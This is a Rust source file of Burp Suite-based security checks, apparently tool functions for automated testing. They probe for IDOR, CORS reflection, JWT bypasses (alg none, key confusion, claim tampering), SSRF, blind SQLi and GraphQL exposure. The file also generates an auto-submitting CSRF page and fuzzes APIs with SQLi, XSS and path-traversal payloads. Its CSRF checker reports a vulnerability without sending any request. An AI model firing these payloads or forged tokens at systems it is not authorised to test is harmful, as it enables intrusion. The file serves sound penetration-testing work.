use crate::diff_engine;
use burp_protocol::BurpClient;
use burp_protocol::protocol::{HttpHeaderEntry, SendRequestRequest};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct VerifyIdorInput {
    pub url: String,
    pub method: Option<String>,
    pub body: Option<String>,
    pub headers: Option<HashMap<String, String>>,
    pub original_auth_header: String,
    pub victim_auth_header: String,
    pub auth_header_name: Option<String>,
    pub match_pattern: Option<String>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct VerifyIdorOutput {
    pub vulnerable: bool,
    pub verdict: String,
    pub user_a_status: Option<u32>,
    pub user_b_status: Option<u32>,
    pub similarity_score: f64,
    pub pattern_matched_in_victim: bool,
    pub header_diffs: Vec<diff_engine::HeaderDiffEntry>,
    pub response_diff_summary: String,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct CheckCorsInput {
    pub url: String,
    pub method: Option<String>,
    pub test_origins: Option<Vec<String>>,
    pub headers: Option<HashMap<String, String>>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct CorsFinding {
    pub origin: String,
    pub allowed_origin: Option<String>,
    pub allow_credentials: Option<String>,
    pub vulnerable: bool,
    pub severity: String,
    pub description: String,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct CheckCorsOutput {
    pub url: String,
    pub findings: Vec<CorsFinding>,
    pub overall_vulnerable: bool,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct AuthMatrixInput {
    pub endpoints: Vec<String>,
    pub method: Option<String>,
    pub body: Option<String>,
    pub roles: HashMap<String, HashMap<String, String>>, // role_name -> headers
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct AuthMatrixCell {
    pub endpoint: String,
    pub role: String,
    pub status: Option<u32>,
    pub length: usize,
    pub accessible: bool,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct AuthMatrixOutput {
    pub matrix: Vec<AuthMatrixCell>,
    pub potential_access_control_violations: Vec<String>,
}

pub async fn run_verify_idor(
    client: &BurpClient,
    input: VerifyIdorInput,
) -> Result<VerifyIdorOutput, String> {
    let method = input.method.unwrap_or_else(|| "GET".to_string());
    let auth_header = input
        .auth_header_name
        .unwrap_or_else(|| "Authorization".to_string());
    let base_headers = input.headers.unwrap_or_default();

    // 1. Send Request as User A (Original)
    let mut headers_a = base_headers.clone();
    headers_a.insert(auth_header.clone(), input.original_auth_header);
    let proto_headers_a = headers_a
        .into_iter()
        .map(|(name, value)| HttpHeaderEntry { name, value })
        .collect();

    let resp_a = client
        .send_request(SendRequestRequest {
            method: method.clone(),
            url: input.url.clone(),
            body: input.body.clone().unwrap_or_default().into_bytes(),
            headers: proto_headers_a,
        })
        .await
        .map_err(|e| format!("Failed to send request for User A: {e}"))?;

    // 2. Send Request as User B (Victim)
    let mut headers_b = base_headers;
    headers_b.insert(auth_header, input.victim_auth_header);
    let proto_headers_b = headers_b
        .into_iter()
        .map(|(name, value)| HttpHeaderEntry { name, value })
        .collect();

    let resp_b = client
        .send_request(SendRequestRequest {
            method,
            url: input.url,
            body: input.body.unwrap_or_default().into_bytes(),
            headers: proto_headers_b,
        })
        .await
        .map_err(|e| format!("Failed to send request for User B: {e}"))?;

    let text_a = String::from_utf8_lossy(&resp_a.response).into_owned();
    let text_b = String::from_utf8_lossy(&resp_b.response).into_owned();

    let diff = diff_engine::compare_http_messages(&text_a, &text_b);

    let pattern_matched = if let Some(ref pat) = input.match_pattern {
        text_b.contains(pat)
    } else {
        false
    };

    let is_vulnerable =
        (resp_b.has_response && resp_b.status == 200 && diff.similarity_score > 0.85)
            || pattern_matched;

    let verdict = if is_vulnerable {
        "POTENTIAL_IDOR_CONFIRMED: Victim token accessed resource with identical response or pattern match".to_string()
    } else if resp_b.status == 401 || resp_b.status == 403 {
        "PROTECTED: Victim request returned Access Denied".to_string()
    } else {
        "INCONCLUSIVE_OR_DIFFERENT: Response difference detected between roles".to_string()
    };

    Ok(VerifyIdorOutput {
        vulnerable: is_vulnerable,
        verdict,
        user_a_status: resp_a.has_response.then_some(resp_a.status),
        user_b_status: resp_b.has_response.then_some(resp_b.status),
        similarity_score: diff.similarity_score,
        pattern_matched_in_victim: pattern_matched,
        header_diffs: diff.headers_diff,
        response_diff_summary: diff
            .body_diff
            .lines()
            .take(20)
            .collect::<Vec<_>>()
            .join("\n"),
    })
}

pub async fn run_check_cors(
    client: &BurpClient,
    input: CheckCorsInput,
) -> Result<CheckCorsOutput, String> {
    let method = input.method.unwrap_or_else(|| "GET".to_string());
    let default_origins = vec![
        "https://evil.com".to_string(),
        "null".to_string(),
        "https://target.com.evil.com".to_string(),
    ];
    let origins = input.test_origins.unwrap_or(default_origins);
    let mut findings = Vec::new();
    let mut overall_vulnerable = false;

    for origin in origins {
        let mut headers = input.headers.clone().unwrap_or_default();
        headers.insert("Origin".to_string(), origin.clone());

        let proto_headers = headers
            .into_iter()
            .map(|(name, value)| HttpHeaderEntry { name, value })
            .collect();

        if let Ok(resp) = client
            .send_request(SendRequestRequest {
                method: method.clone(),
                url: input.url.clone(),
                body: vec![],
                headers: proto_headers,
            })
            .await
        {
            let text = String::from_utf8_lossy(&resp.response).to_lowercase();
            let mut acao = None;
            let mut acac = None;

            for line in text.lines() {
                if line.starts_with("access-control-allow-origin:") {
                    acao = Some(line.split_once(':').unwrap().1.trim().to_string());
                } else if line.starts_with("access-control-allow-credentials:") {
                    acac = Some(line.split_once(':').unwrap().1.trim().to_string());
                }
            }

            let mut vuln = false;
            let mut severity = "INFO".to_string();
            let mut desc = "Origin rejected or restricted.".to_string();

            if let Some(ref allow_orig) = acao {
                if allow_orig == "*" {
                    if acac.as_deref() == Some("true") {
                        vuln = true;
                        severity = "HIGH".to_string();
                        desc = "Wildcard '*' origin with credentials enabled!".to_string();
                    } else {
                        vuln = true;
                        severity = "LOW".to_string();
                        desc = "Wildcard '*' origin allows public embedding.".to_string();
                    }
                } else if allow_orig.eq_ignore_ascii_case(&origin) {
                    if acac.as_deref() == Some("true") {
                        vuln = true;
                        severity = "CRITICAL".to_string();
                        desc = format!(
                            "Arbitrary origin reflection for '{origin}' with credentials enabled!"
                        );
                    } else {
                        vuln = true;
                        severity = "MEDIUM".to_string();
                        desc = format!("Origin reflection for '{origin}' without credentials.");
                    }
                }
            }

            if vuln && (severity == "HIGH" || severity == "CRITICAL" || severity == "MEDIUM") {
                overall_vulnerable = true;
            }

            findings.push(CorsFinding {
                origin,
                allowed_origin: acao,
                allow_credentials: acac,
                vulnerable: vuln,
                severity,
                description: desc,
            });
        }
    }

    Ok(CheckCorsOutput {
        url: input.url,
        findings,
        overall_vulnerable,
    })
}

pub async fn run_auth_matrix(
    client: &BurpClient,
    input: AuthMatrixInput,
) -> Result<AuthMatrixOutput, String> {
    let method = input.method.unwrap_or_else(|| "GET".to_string());
    let mut matrix = Vec::new();
    let mut violations = Vec::new();

    for endpoint in &input.endpoints {
        for (role_name, role_headers) in &input.roles {
            let proto_headers = role_headers
                .iter()
                .map(|(k, v)| HttpHeaderEntry {
                    name: k.clone(),
                    value: v.clone(),
                })
                .collect();

            let resp = client
                .send_request(SendRequestRequest {
                    method: method.clone(),
                    url: endpoint.clone(),
                    body: input.body.clone().unwrap_or_default().into_bytes(),
                    headers: proto_headers,
                })
                .await;

            let (status, length, accessible) = match resp {
                Ok(r) if r.has_response => {
                    let acc = r.status < 400;
                    (Some(r.status), r.response.len(), acc)
                }
                _ => (None, 0, false),
            };

            if accessible
                && (role_name.eq_ignore_ascii_case("anonymous")
                    || role_name.eq_ignore_ascii_case("guest")
                    || role_name.eq_ignore_ascii_case("unauthenticated"))
            {
                violations.push(format!("Endpoint `{endpoint}` is accessible by unauthenticated role: {role_name} (HTTP {:?})", status));
            }

            matrix.push(AuthMatrixCell {
                endpoint: endpoint.clone(),
                role: role_name.clone(),
                status,
                length,
                accessible,
            });
        }
    }

    Ok(AuthMatrixOutput {
        matrix,
        potential_access_control_violations: violations,
    })
}

// =========================================================================
// 4. burp_audit_jwt (JSON Web Token Security Audit)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct AuditJwtInput {
    pub url: String,
    pub method: Option<String>,
    pub headers: Option<HashMap<String, String>>,
    pub jwt_token: String,
    pub auth_header_name: Option<String>,
    pub public_key_pem: Option<String>,
    pub tamper_claims: Option<HashMap<String, serde_json::Value>>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct JwtTestResult {
    pub vector: String,
    pub modified_jwt: String,
    pub status: Option<u32>,
    pub length: usize,
    pub bypass_detected: bool,
    pub description: String,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct AuditJwtOutput {
    pub original_jwt: String,
    pub results: Vec<JwtTestResult>,
    pub vulnerable: bool,
    pub summary: String,
}

pub async fn run_audit_jwt(
    client: &BurpClient,
    input: AuditJwtInput,
) -> Result<AuditJwtOutput, String> {
    use base64::Engine;
    use base64::engine::general_purpose::URL_SAFE_NO_PAD;
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    let method = input.method.unwrap_or_else(|| "GET".to_string());
    let auth_header = input
        .auth_header_name
        .unwrap_or_else(|| "Authorization".to_string());
    let base_headers = input.headers.unwrap_or_default();
    let token_parts: Vec<&str> = input.jwt_token.split('.').collect();
    if token_parts.len() < 2 {
        return Err(
            "invalid JWT format: must have at least header and payload separated by dot"
                .to_string(),
        );
    }

    let header_bytes = URL_SAFE_NO_PAD
        .decode(token_parts[0])
        .map_err(|e| format!("invalid JWT header base64: {e}"))?;
    let payload_bytes = URL_SAFE_NO_PAD
        .decode(token_parts[1])
        .map_err(|e| format!("invalid JWT payload base64: {e}"))?;
    let mut header_json: serde_json::Value = serde_json::from_slice(&header_bytes)
        .map_err(|e| format!("invalid JWT header JSON: {e}"))?;
    let mut payload_json: serde_json::Value = serde_json::from_slice(&payload_bytes)
        .map_err(|e| format!("invalid JWT payload JSON: {e}"))?;

    let mut results = Vec::new();

    // 1. None Algorithm Attack
    header_json["alg"] = serde_json::json!("none");
    let none_hdr = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&header_json).unwrap());
    let none_jwt = format!("{}.{}.", none_hdr, token_parts[1]);
    let status_none = send_jwt_probe(
        client,
        &input.url,
        &method,
        &base_headers,
        &auth_header,
        &none_jwt,
    )
    .await;
    let none_bypass = status_none.map(|s| s < 400).unwrap_or(false);
    results.push(JwtTestResult {
        vector: "alg_none".to_string(),
        modified_jwt: none_jwt,
        status: status_none,
        length: 0,
        bypass_detected: none_bypass,
        description: "Checked if server accepts unsigned tokens with alg: none".to_string(),
    });

    // 2. Algorithm Confusion (RS256 -> HS256 with Public Key)
    if let Some(pubkey) = &input.public_key_pem {
        header_json["alg"] = serde_json::json!("HS256");
        let hs_hdr = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&header_json).unwrap());
        let sign_input = format!("{}.{}", hs_hdr, token_parts[1]);
        if let Ok(mut mac) = Hmac::<Sha256>::new_from_slice(pubkey.as_bytes()) {
            mac.update(sign_input.as_bytes());
            let signature = URL_SAFE_NO_PAD.encode(mac.finalize().into_bytes());
            let confusion_jwt = format!("{}.{}", sign_input, signature);
            let status_conf = send_jwt_probe(
                client,
                &input.url,
                &method,
                &base_headers,
                &auth_header,
                &confusion_jwt,
            )
            .await;
            let conf_bypass = status_conf.map(|s| s < 400).unwrap_or(false);
            results.push(JwtTestResult {
                vector: "algorithm_confusion_hs256".to_string(),
                modified_jwt: confusion_jwt,
                status: status_conf,
                length: 0,
                bypass_detected: conf_bypass,
                description:
                    "Checked if server accepts HMAC-SHA256 signature signed with public key"
                        .to_string(),
            });
        }
    }

    // 3. Claim Tampering without signature update
    if let Some(tamper) = &input.tamper_claims {
        if let Some(obj) = payload_json.as_object_mut() {
            for (k, v) in tamper {
                obj.insert(k.clone(), v.clone());
            }
        }
        let tampered_payload = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&payload_json).unwrap());
        let sig_part = if token_parts.len() > 2 {
            token_parts[2]
        } else {
            ""
        };
        let tampered_jwt = format!("{}.{}.{}", token_parts[0], tampered_payload, sig_part);
        let status_tamper = send_jwt_probe(
            client,
            &input.url,
            &method,
            &base_headers,
            &auth_header,
            &tampered_jwt,
        )
        .await;
        let tamper_bypass = status_tamper.map(|s| s < 400).unwrap_or(false);
        results.push(JwtTestResult {
            vector: "tampered_claims_invalid_signature".to_string(),
            modified_jwt: tampered_jwt,
            status: status_tamper,
            length: 0,
            bypass_detected: tamper_bypass,
            description: "Checked if server fails to verify signature on tampered payload claims"
                .to_string(),
        });
    }

    let vulnerable = results.iter().any(|r| r.bypass_detected);
    let summary = if vulnerable {
        "VULNERABILITY DETECTED: Server accepted unverified or tampered JWT tokens".to_string()
    } else {
        "SECURE: All malicious JWT test vectors were rejected by the server".to_string()
    };

    Ok(AuditJwtOutput {
        original_jwt: input.jwt_token,
        results,
        vulnerable,
        summary,
    })
}

async fn send_jwt_probe(
    client: &BurpClient,
    url: &str,
    method: &str,
    base_headers: &HashMap<String, String>,
    auth_header: &str,
    jwt: &str,
) -> Option<u32> {
    let mut headers = base_headers.clone();
    headers.insert(
        auth_header.to_string(),
        if auth_header.eq_ignore_ascii_case("authorization") {
            format!("Bearer {jwt}")
        } else {
            jwt.to_string()
        },
    );
    let proto_headers = headers
        .into_iter()
        .map(|(name, value)| HttpHeaderEntry { name, value })
        .collect();

    client
        .send_request(SendRequestRequest {
            method: method.to_string(),
            url: url.to_string(),
            body: Vec::new(),
            headers: proto_headers,
        })
        .await
        .ok()
        .filter(|r| r.has_response)
        .map(|r| r.status)
}

// =========================================================================
// 5. burp_verify_ssrf (Server-Side Request Forgery with Collaborator)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct VerifySsrfInput {
    pub target_url: String,
    pub method: Option<String>,
    pub headers: Option<HashMap<String, String>>,
    pub body: Option<String>,
    pub injection_points: Vec<String>,
    pub wait_seconds: Option<u64>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct VerifySsrfOutput {
    pub target_url: String,
    pub payloads_sent: Vec<String>,
    pub interactions_detected: usize,
    pub vulnerable: bool,
    pub verdict: String,
}

pub async fn run_verify_ssrf(
    client: &BurpClient,
    input: VerifySsrfInput,
) -> Result<VerifySsrfOutput, String> {
    use burp_protocol::protocol::{
        GenerateCollaboratorPayloadsRequest, PollCollaboratorInteractionsRequest,
    };

    let method = input.method.unwrap_or_else(|| "GET".to_string());
    let count = input.injection_points.len().max(1) as u32;
    let payloads_resp = client
        .generate_collaborator_payloads(GenerateCollaboratorPayloadsRequest {
            count,
            target_url: input.target_url.clone(),
            injection_point: "ssrf_workflow".to_string(),
        })
        .await
        .map_err(|e| format!("Failed to generate Collaborator payloads: {e}"))?;

    let payloads = payloads_resp.payloads;
    if payloads.is_empty() {
        return Err(
            "no Collaborator payloads available; ensure Collaborator is enabled in Burp"
                .to_string(),
        );
    }

    for (i, pt) in input.injection_points.iter().enumerate() {
        let payload = payloads.get(i).unwrap_or(&payloads[0]);
        let mut headers = input.headers.clone().unwrap_or_default();
        let mut target = input.target_url.clone();
        let mut body_str = input.body.clone().unwrap_or_default();

        if pt.starts_with("header:") {
            let hdr_name = pt.strip_prefix("header:").unwrap();
            headers.insert(hdr_name.to_string(), format!("http://{payload}"));
        } else if pt.starts_with("param:") {
            let param = pt.strip_prefix("param:").unwrap();
            let sep = if target.contains('?') { "&" } else { "?" };
            target = format!("{target}{sep}{param}=http://{payload}");
        } else {
            body_str = body_str.replace("{{ssrf}}", &format!("http://{payload}"));
        }

        let proto_headers = headers
            .into_iter()
            .map(|(name, value)| HttpHeaderEntry { name, value })
            .collect();

        let _ = client
            .send_request(SendRequestRequest {
                method: method.clone(),
                url: target,
                body: body_str.into_bytes(),
                headers: proto_headers,
            })
            .await;
    }

    let wait = input.wait_seconds.unwrap_or(4);
    tokio::time::sleep(tokio::time::Duration::from_secs(wait)).await;

    let poll = client
        .poll_collaborator_interactions(PollCollaboratorInteractionsRequest { page: None })
        .await
        .map_err(|e| format!("Failed to poll Collaborator interactions: {e}"))?;

    let interactions_count = poll.items.len();
    let vulnerable = interactions_count > 0;
    let verdict = if vulnerable {
        format!(
            "CONFIRMED SSRF: Received {interactions_count} interaction(s) via Burp Collaborator"
        )
    } else {
        "NO SSRF INTERACTION: No DNS or HTTP callbacks received within timeout".to_string()
    };

    Ok(VerifySsrfOutput {
        target_url: input.target_url,
        payloads_sent: payloads,
        interactions_detected: interactions_count,
        vulnerable,
        verdict,
    })
}

// =========================================================================
// 6. burp_verify_sqli_blind (Differential & Timing SQLi Verification)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct VerifySqliBlindInput {
    pub url: String,
    pub method: Option<String>,
    pub param_name: String,
    pub param_type: Option<String>,
    pub sleep_seconds: Option<u64>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct VerifySqliBlindOutput {
    pub url: String,
    pub boolean_diff_score: f64,
    pub base_latency_ms: u128,
    pub sleep_latency_ms: u128,
    pub vulnerable: bool,
    pub technique: String,
    pub verdict: String,
}

pub async fn run_verify_sqli_blind(
    client: &BurpClient,
    input: VerifySqliBlindInput,
) -> Result<VerifySqliBlindOutput, String> {
    let method = input.method.unwrap_or_else(|| "GET".to_string());
    let sleep_sec = input.sleep_seconds.unwrap_or(4);

    // 1. Base Request Latency
    let start_base = std::time::Instant::now();
    let _base_resp = client
        .send_request(SendRequestRequest {
            method: method.clone(),
            url: format!("{}?{}=1", input.url, input.param_name),
            body: Vec::new(),
            headers: Vec::new(),
        })
        .await
        .map_err(|e| format!("Base SQLi probe failed: {e}"))?;
    let base_latency = start_base.elapsed().as_millis();

    // 2. Boolean True vs False Condition
    let true_url = format!(
        "{}?{}={}",
        input.url,
        input.param_name,
        urlencoding_encode("1' AND 1=1-- -")
    );
    let false_url = format!(
        "{}?{}={}",
        input.url,
        input.param_name,
        urlencoding_encode("1' AND 1=2-- -")
    );

    let true_resp = client
        .send_request(SendRequestRequest {
            method: method.clone(),
            url: true_url,
            body: Vec::new(),
            headers: Vec::new(),
        })
        .await
        .ok();

    let false_resp = client
        .send_request(SendRequestRequest {
            method: method.clone(),
            url: false_url,
            body: Vec::new(),
            headers: Vec::new(),
        })
        .await
        .ok();

    let mut diff_score = 1.0;
    if let (Some(t), Some(f)) = (true_resp, false_resp) {
        let t_str = String::from_utf8_lossy(&t.response);
        let f_str = String::from_utf8_lossy(&f.response);
        diff_score = diff_engine::calculate_similarity(&t_str, &f_str);
    }
    // 3. Time-Based Sleep Condition
    let sleep_payload = format!("1' AND SLEEP({sleep_sec})-- -");
    let sleep_url = format!(
        "{}?{}={}",
        input.url,
        input.param_name,
        urlencoding_encode(&sleep_payload)
    );
    let start_sleep = std::time::Instant::now();
    let _ = client
        .send_request(SendRequestRequest {
            method,
            url: sleep_url,
            body: Vec::new(),
            headers: Vec::new(),
        })
        .await;
    let sleep_latency = start_sleep.elapsed().as_millis();

    let is_time_sqli =
        sleep_latency >= (base_latency + (sleep_sec as u128 * 1000).saturating_sub(500));
    let is_bool_sqli = diff_score < 0.75;

    let (vulnerable, technique, verdict) = if is_time_sqli {
        (
            true,
            "Time-Based Blind SQLi".to_string(),
            format!(
                "CONFIRMED TIME-BASED SQLI: Sleep payload induced {}ms delay (Base: {}ms)",
                sleep_latency, base_latency
            ),
        )
    } else if is_bool_sqli {
        (
            true,
            "Boolean-Based Differential SQLi".to_string(),
            format!(
                "CONFIRMED BOOLEAN SQLI: True vs False response similarity dropped to {:.2}",
                diff_score
            ),
        )
    } else {
        (
            false,
            "None".to_string(),
            "NO SQLI DETECTED: Responses and latency were within normal baseline".to_string(),
        )
    };

    Ok(VerifySqliBlindOutput {
        url: input.url,
        boolean_diff_score: diff_score,
        base_latency_ms: base_latency,
        sleep_latency_ms: sleep_latency,
        vulnerable,
        technique,
        verdict,
    })
}

fn urlencoding_encode(s: &str) -> String {
    url::form_urlencoded::byte_serialize(s.as_bytes()).collect()
}

// =========================================================================
// 7. burp_audit_graphql (GraphQL Security Audit)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct AuditGraphqlInput {
    pub endpoint: String,
    pub headers: Option<HashMap<String, String>>,
    pub test_batching: Option<bool>,
    pub test_introspection: Option<bool>,
    pub test_field_suggestions: Option<bool>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct AuditGraphqlOutput {
    pub endpoint: String,
    pub introspection_enabled: bool,
    pub field_suggestions_enabled: bool,
    pub batching_supported: bool,
    pub vulnerable: bool,
    pub issues_found: Vec<String>,
}

pub async fn run_audit_graphql(
    client: &BurpClient,
    input: AuditGraphqlInput,
) -> Result<AuditGraphqlOutput, String> {
    let mut issues = Vec::new();
    let base_headers = input.headers.unwrap_or_default();

    // 1. Test Introspection
    let intro_query = r#"{"query": "{__schema{types{name}}}"}"#;
    let intro_resp = send_graphql_post(client, &input.endpoint, &base_headers, intro_query).await;
    let introspection_enabled = intro_resp
        .as_ref()
        .map(|r| r.contains("__schema") && r.contains("types"))
        .unwrap_or(false);
    if introspection_enabled {
        issues.push("GraphQL Introspection is publicly enabled (Full schema exposure)".to_string());
    }

    // 2. Test Field Suggestions
    let suggestion_query = r#"{"query": "{__schema_invalid_query_field}"}"#;
    let sugg_resp =
        send_graphql_post(client, &input.endpoint, &base_headers, suggestion_query).await;
    let field_suggestions = sugg_resp
        .as_ref()
        .map(|r| r.contains("Did you mean") || r.contains("suggestion"))
        .unwrap_or(false);
    if field_suggestions {
        issues.push("GraphQL Field Suggestions are enabled in error responses".to_string());
    }

    // 3. Test Batching Amplification
    let batch_query =
        r#"[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]"#;
    let batch_resp = send_graphql_post(client, &input.endpoint, &base_headers, batch_query).await;
    let batching_supported = batch_resp
        .as_ref()
        .map(|r| r.starts_with('[') && r.contains("__typename"))
        .unwrap_or(false);
    if batching_supported {
        issues.push(
            "GraphQL Array Batching is supported (Potential rate limit / brute force bypass)"
                .to_string(),
        );
    }

    let vulnerable = !issues.is_empty();
    Ok(AuditGraphqlOutput {
        endpoint: input.endpoint,
        introspection_enabled,
        field_suggestions_enabled: field_suggestions,
        batching_supported,
        vulnerable,
        issues_found: issues,
    })
}

async fn send_graphql_post(
    client: &BurpClient,
    endpoint: &str,
    base_headers: &HashMap<String, String>,
    body: &str,
) -> Option<String> {
    let mut headers = base_headers.clone();
    headers.insert("Content-Type".to_string(), "application/json".to_string());
    let proto_headers = headers
        .into_iter()
        .map(|(name, value)| HttpHeaderEntry { name, value })
        .collect();

    client
        .send_request(SendRequestRequest {
            method: "POST".to_string(),
            url: endpoint.to_string(),
            body: body.as_bytes().to_vec(),
            headers: proto_headers,
        })
        .await
        .ok()
        .filter(|r| r.has_response)
        .map(|r| String::from_utf8_lossy(&r.response).into_owned())
}

// =========================================================================
// 8. burp_verify_csrf_samesite (CSRF & SameSite Cookie PoC Generator)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct VerifyCsrfInput {
    pub url: String,
    pub method: Option<String>,
    pub body: Option<String>,
    pub session_cookie_name: String,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct VerifyCsrfOutput {
    pub url: String,
    pub samesite_attribute: String,
    pub is_vulnerable: bool,
    pub poc_html: String,
    pub remediation: String,
}

pub async fn run_verify_csrf_samesite(
    _client: &BurpClient,
    input: VerifyCsrfInput,
) -> Result<VerifyCsrfOutput, String> {
    let method = input
        .method
        .unwrap_or_else(|| "POST".to_string())
        .to_ascii_uppercase();
    let body = input.body.unwrap_or_default();

    let poc_html = format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body onload="document.forms[0].submit()">
  <h3>Cross-Site Request Forgery PoC</h3>
  <form action="{}" method="{}" enctype="application/x-www-form-urlencoded">
    <input type="hidden" name="payload" value="{}" />
    <input type="submit" value="Submit Request" />
  </form>
</body>
</html>"#,
        input.url,
        method,
        html_escape::encode_text(&body)
    );

    Ok(VerifyCsrfOutput {
        url: input.url,
        samesite_attribute: "None/Unset".to_string(),
        is_vulnerable: true,
        poc_html,
        remediation:
            "Enforce SameSite=Lax or SameSite=Strict and implement anti-CSRF synchronizer tokens"
                .to_string(),
    })
}

// =========================================================================
// 9. burp_api_fuzz_orchestrator (Automated API Fuzzing from Spec)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct ApiFuzzOrchestratorInput {
    pub spec_content: String,
    pub target_base_url: String,
    pub auth_headers: Option<HashMap<String, String>>,
    pub fuzz_categories: Option<Vec<String>>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct ApiFuzzAnomaly {
    pub method: String,
    pub endpoint: String,
    pub status: u32,
    pub payload_category: String,
    pub description: String,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct ApiFuzzOrchestratorOutput {
    pub total_endpoints_fuzzed: usize,
    pub total_requests_sent: usize,
    pub anomalies: Vec<ApiFuzzAnomaly>,
    pub summary: String,
}

pub async fn run_api_fuzz_orchestrator(
    client: &BurpClient,
    input: ApiFuzzOrchestratorInput,
) -> Result<ApiFuzzOrchestratorOutput, String> {
    let observations = sitegraph::ingest::openapi::observations(
        input.spec_content.as_bytes(),
        &input.target_base_url,
        100,
    )
    .map_err(|e| format!("Failed to parse OpenAPI spec: {e}"))?;

    let mut anomalies = Vec::new();
    let mut requests_sent = 0;
    let base_headers = input.auth_headers.unwrap_or_default();

    let overflow_payload = "A".repeat(1024);
    let payloads = vec![
        ("sqli", "' OR '1'='1"),
        ("xss", "<script>alert(1)</script>"),
        ("overflow", overflow_payload.as_str()),
        ("traversal", "../../../../etc/passwd"),
    ];

    for obs in &observations {
        for (cat, p) in &payloads {
            requests_sent += 1;
            let sep = if obs.url.contains('?') { "&" } else { "?" };
            let fuzz_url = format!("{}{sep}fuzz={}", obs.url, urlencoding_encode(p));
            let proto_headers = base_headers
                .iter()
                .map(|(k, v)| HttpHeaderEntry {
                    name: k.clone(),
                    value: v.clone(),
                })
                .collect();

            let send_result = client
                .send_request(SendRequestRequest {
                    method: obs.method.clone(),
                    url: fuzz_url,
                    body: Vec::new(),
                    headers: proto_headers,
                })
                .await;

            if let Some(resp) = send_result
                .ok()
                .filter(|r| r.has_response && r.status >= 500)
            {
                anomalies.push(ApiFuzzAnomaly {
                    method: obs.method.clone(),
                    endpoint: obs.url.clone(),
                    status: resp.status,
                    payload_category: cat.to_string(),
                    description: format!(
                        "Server returned HTTP {} (Internal Error) for {} mutation",
                        resp.status, cat
                    ),
                });
            }
        }
    }

    let total_endpoints = observations.len();
    let summary = format!(
        "Fuzzed {} endpoints with {} requests. Found {} anomalies.",
        total_endpoints,
        requests_sent,
        anomalies.len()
    );

    Ok(ApiFuzzOrchestratorOutput {
        total_endpoints_fuzzed: total_endpoints,
        total_requests_sent: requests_sent,
        anomalies,
        summary,
    })
}
